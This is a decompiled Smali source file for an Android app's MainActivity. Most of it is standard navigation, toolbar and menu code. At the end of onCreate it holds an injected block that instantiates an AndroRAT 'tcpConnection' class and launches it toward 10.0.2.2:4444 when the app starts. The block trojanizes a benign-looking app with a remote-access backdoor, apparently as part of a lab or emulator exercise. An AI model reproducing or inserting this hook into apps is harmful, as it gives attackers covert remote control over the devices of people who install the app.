.class public Lcom/example/simple_app/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# instance fields
.field private appBarConfiguration:Landroidx/navigation/ui/AppBarConfiguration;

.field private binding:Lcom/example/simple_app/databinding/ActivityMainBinding;

.field activity:Landroid/app/Activity; 

.field context:Landroid/content/Context; 

# direct methods
.method public constructor <init>()V
    .locals 0

    .line 21
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 28
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 30
    invoke-virtual {p0}, Lcom/example/simple_app/MainActivity;->getLayoutInflater()Landroid/view/LayoutInflater;

    move-result-object v0

    invoke-static {v0}, Lcom/example/simple_app/databinding/ActivityMainBinding;->inflate(Landroid/view/LayoutInflater;)Lcom/example/simple_app/databinding/ActivityMainBinding;

    move-result-object v0

    iput-object v0, p0, Lcom/example/simple_app/MainActivity;->binding:Lcom/example/simple_app/databinding/ActivityMainBinding;

    .line 31
    invoke-virtual {v0}, Lcom/example/simple_app/databinding/ActivityMainBinding;->getRoot()Landroidx/coordinatorlayout/widget/CoordinatorLayout;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/example/simple_app/MainActivity;->setContentView(Landroid/view/View;)V

    .line 33
    iget-object v0, p0, Lcom/example/simple_app/MainActivity;->binding:Lcom/example/simple_app/databinding/ActivityMainBinding;

    iget-object v0, v0, Lcom/example/simple_app/databinding/ActivityMainBinding;->toolbar:Landroidx/appcompat/widget/Toolbar;

    invoke-virtual {p0, v0}, Lcom/example/simple_app/MainActivity;->setSupportActionBar(Landroidx/appcompat/widget/Toolbar;)V

    .line 35
    const v0, 0x7f080133

    invoke-static {p0, v0}, Landroidx/navigation/Navigation;->findNavController(Landroid/app/Activity;I)Landroidx/navigation/NavController;

    move-result-object v0

    .line 36
    .local v0, "navController":Landroidx/navigation/NavController;
    new-instance v1, Landroidx/navigation/ui/AppBarConfiguration$Builder;

    invoke-virtual {v0}, Landroidx/navigation/NavController;->getGraph()Landroidx/navigation/NavGraph;

    move-result-object v2

    invoke-direct {v1, v2}, Landroidx/navigation/ui/AppBarConfiguration$Builder;-><init>(Landroidx/navigation/NavGraph;)V

    invoke-virtual {v1}, Landroidx/navigation/ui/AppBarConfiguration$Builder;->build()Landroidx/navigation/ui/AppBarConfiguration;

    move-result-object v1

    iput-object v1, p0, Lcom/example/simple_app/MainActivity;->appBarConfiguration:Landroidx/navigation/ui/AppBarConfiguration;

    .line 37
    invoke-static {p0, v0, v1}, Landroidx/navigation/ui/NavigationUI;->setupActionBarWithNavController(Landroidx/appcompat/app/AppCompatActivity;Landroidx/navigation/NavController;Landroidx/navigation/ui/AppBarConfiguration;)V

    .line 39
    iget-object v1, p0, Lcom/example/simple_app/MainActivity;->binding:Lcom/example/simple_app/databinding/ActivityMainBinding;

    iget-object v1, v1, Lcom/example/simple_app/databinding/ActivityMainBinding;->fab:Lcom/google/android/material/floatingactionbutton/FloatingActionButton;

    new-instance v2, Lcom/example/simple_app/MainActivity$1;

    invoke-direct {v2, p0}, Lcom/example/simple_app/MainActivity$1;-><init>(Lcom/example/simple_app/MainActivity;)V

    invoke-virtual {v1, v2}, Lcom/google/android/material/floatingactionbutton/FloatingActionButton;->setOnClickListener(Landroid/view/View$OnClickListener;)V

invoke-virtual {p0}, Lcom/example/simple_app/MainActivity;->getApplicationContext()Landroid/content/Context; 

 
 

move-result-object v1 

 
 

iput-object v1, p0, Lcom/example/simple_app/MainActivity;->context:Landroid/content/Context; 

 
 

const-string v3, "10.0.2.2" 

 
 

const-string v4, "4444" 

 
 

new-instance v2, Lcom/example/androrat/tcpConnection; 

 
 

iget-object v3, p0, Lcom/example/simple_app/MainActivity;->activity:Landroid/app/Activity; 

 
 

iget-object v4, p0, Lcom/example/simple_app/MainActivity;->context:Landroid/content/Context; 

 
 

invoke-direct {v2, v3, v4}, Lcom/example/androrat/tcpConnection;-><init>(Landroid/app/Activity;Landroid/content/Context;)V 

const-string v3, "10.0.2.2" 

 
 

const-string v4, "4444" 

 
 

filled-new-array {v3, v4}, [Ljava/lang/String; 

 
 

move-result-object v3 

 
 

invoke-virtual {v2, v3}, Lcom/example/androrat/tcpConnection;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask; 

    .line 46
    return-void
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 2
    .param p1, "menu"    # Landroid/view/Menu;

    .line 51
    invoke-virtual {p0}, Lcom/example/simple_app/MainActivity;->getMenuInflater()Landroid/view/MenuInflater;

    move-result-object v0

    const v1, 0x7f0c0002

    invoke-virtual {v0, v1, p1}, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V

    .line 52
    const/4 v0, 0x1

    return v0
.end method

.method public onOptionsItemSelected(Landroid/view/MenuItem;)Z
    .locals 2
    .param p1, "item"    # Landroid/view/MenuItem;

    .line 60
    invoke-interface {p1}, Landroid/view/MenuItem;->getItemId()I

    move-result v0

    .line 63
    .local v0, "id":I
    const v1, 0x7f080047

    if-ne v0, v1, :cond_0

    .line 64
    const/4 v1, 0x1

    return v1

    .line 67
    :cond_0
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onOptionsItemSelected(Landroid/view/MenuItem;)Z

    move-result v1

    return v1
.end method

.method public onSupportNavigateUp()Z
    .locals 2

    .line 72
    const v0, 0x7f080133

    invoke-static {p0, v0}, Landroidx/navigation/Navigation;->findNavController(Landroid/app/Activity;I)Landroidx/navigation/NavController;

    move-result-object v0

    .line 73
    .local v0, "navController":Landroidx/navigation/NavController;
    iget-object v1, p0, Lcom/example/simple_app/MainActivity;->appBarConfiguration:Landroidx/navigation/ui/AppBarConfiguration;

    invoke-static {v0, v1}, Landroidx/navigation/ui/NavigationUI;->navigateUp(Landroidx/navigation/NavController;Landroidx/navigation/ui/AppBarConfiguration;)Z

    move-result v1

    if-nez v1, :cond_1

    .line 74
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onSupportNavigateUp()Z

    move-result v1

    if-eqz v1, :cond_0

    goto :goto_0

    :cond_0
    const/4 v1, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    const/4 v1, 0x1

    .line 73
    :goto_1
    return v1
.end method
